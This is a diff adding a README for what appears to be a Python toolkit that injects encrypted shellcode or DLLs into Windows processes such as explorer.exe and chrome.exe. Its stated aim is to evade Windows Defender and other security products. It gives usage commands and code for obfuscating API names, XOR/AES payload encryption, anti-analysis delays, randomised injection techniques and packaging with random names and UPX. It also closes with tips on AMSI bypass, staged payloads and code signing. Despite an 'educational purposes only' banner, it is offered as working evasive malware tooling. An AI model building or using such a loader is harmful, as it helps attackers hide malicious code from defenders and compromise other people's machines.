@@ -260,3 +260,151 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 ## Disclaimer
 
 This framework is for educational and research purposes only. The authors are not responsible for any misuse or damage caused by this program. # Final-Project-DU
+
+# Advanced Process Injection Tools with Evasion
+
+This repository contains a collection of tools for performing process injection with advanced evasion techniques to avoid detection by Windows Defender and other security products.
+
+> **⚠️ EDUCATIONAL PURPOSES ONLY ⚠️**  
+> These tools are provided for educational purposes only to understand how malware operates and how to defend against it. Use only in controlled environments and never against systems without explicit permission.
+
+## Features
+
+- **Obfuscated API calls** - String obfuscation for Windows API functions
+- **Multiple injection techniques**:
+  - CreateRemoteThread injection
+  - QueueUserAPC injection (more stealthy)
+  - SetWindowsHookEx injection
+  - DLL injection
+- **Payload encryption**:
+  - XOR encryption
+  - AES-128 encryption (CBC mode)
+- **Anti-analysis features**:
+  - Random delays and junk code
+  - Random technique selection
+  - Renamed suspicious imports
+  - Obfuscated logging
+- **Packaging tools**:
+  - PyInstaller packaging with random names
+  - Optional UPX compression
+  - Obfuscated file names
+
+## Requirements
+
+```
+pip install pywin32 psutil pycryptodome pyinstaller
+```
+
+Optionally, install UPX compressor from: https://github.com/upx/upx/releases
+
+## Usage
+
+### Basic Process Injection
+
+```bash
+# Basic test injection (harmless shellcode)
+python modules/demo_injection.py --target notepad.exe
+
+# DLL injection
+python modules/demo_injection.py --target explorer.exe --dll path/to/payload.dll
+
+# Inject real shellcode with XOR encryption
+python modules/demo_injection.py --target calculator.exe --shellcode path/to/shellcode.bin --encryption xor
+
+# Inject with AES encryption
+python modules/demo_injection.py --target chrome.exe --shellcode path/to/shellcode.bin --encryption aes --key-file keys.bin
+```
+
+### Shellcode Encryption
+
+```bash
+# XOR encryption
+python modules/shellcode_encryptor.py --input shellcode.bin --output encrypted.bin --type xor
+
+# AES encryption
+python modules/shellcode_encryptor.py --input shellcode.bin --output encrypted.bin --type aes --save-key keys.bin
+
+# Generate decryption stub
+python modules/shellcode_encryptor.py --input shellcode.bin --output encrypted.bin --type aes --save-key keys.bin --gen-code decrypt_stub.py
+```
+
+### Building Obfuscated Executable
+
+```bash
+# Build with default settings
+python build_obfuscated_injector.py
+
+# Build with icon and console window
+python build_obfuscated_injector.py --icon app.ico --console
+
+# Build without UPX compression
+python build_obfuscated_injector.py --no-upx
+```
+
+## Evasion Techniques
+
+### 1. String Obfuscation
+
+All suspicious Windows API function names are Base64 encoded and decoded at runtime:
+
+```python
+# Instead of directly calling VirtualAllocEx
+alloc_mem = getattr(kernel32, d(b'VmlydHVhbEFsbG9jRXg='))
+```
+
+### 2. Import Renaming
+
+```python
+# Renamed imports
+import ctypes as c
+import win32con as w_con
+```
+
+### 3. Anti-Analysis Techniques
+
+```python
+def anti_analysis_noise():
+    """Add random operations to confuse static analysis"""
+    time.sleep(random.uniform(0.1, 0.5))
+    a = random.randint(10000, 99999)
+    for i in range(1000):
+        a = (a * i) % 256
+    return a
+```
+
+### 4. Payload Encryption
+
+```python
+# XOR encryption/decryption
+def xor_decrypt(data, key=0x55):
+    return bytes([b ^ key for b in data])
+
+# AES encryption
+cipher = AES.new(key, AES.MODE_CBC, iv)
+encrypted_data = cipher.encrypt(padded_data)
+```
+
+### 5. Technique Variation
+
+```python
+# Randomly select from multiple techniques
+techniques = [
+    lambda ph, enc: self.create_remote_thread(ph, enc, encryption_type),
+    lambda ph, enc: self.queue_user_apc(ph, enc, None, encryption_type),
+    lambda ph, enc: self.set_windows_hook(enc, encryption_type)
+]
+technique = random.choice(techniques)
+```
+
+## Additional Evasion Tips
+
+1. **Disable Defender for testing**:
+   - Use Windows Sandbox or VM
+   - Add exclusions to Windows Defender
+   
+2. **Alternative Payloads**:
+   - Consider using AMSI bypass techniques
+   - Use staged payloads
+   
+3. **Code Signing**:
+   - Sign executables with a valid certificate
